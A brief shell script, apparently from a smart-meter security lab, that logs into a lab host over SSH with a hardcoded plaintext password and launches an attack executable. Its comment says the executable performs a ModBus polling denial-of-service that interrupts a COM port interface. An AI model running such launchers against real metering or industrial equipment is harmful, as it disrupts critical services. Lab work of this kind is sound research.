#!/bin/sh

# Description: This file/script demostrates the interruption of the COM Port interface through a ModBus polling DoS attack on the interface 
# Tag: Interrupt ModBus    
sshpass -p 'Student12345@' ssh -t -o ConnectTimeout=5 student@172.16.2.223 "cd \"C:\Windows\Temp\SmartMetertest\" && Attackscript.exe 6"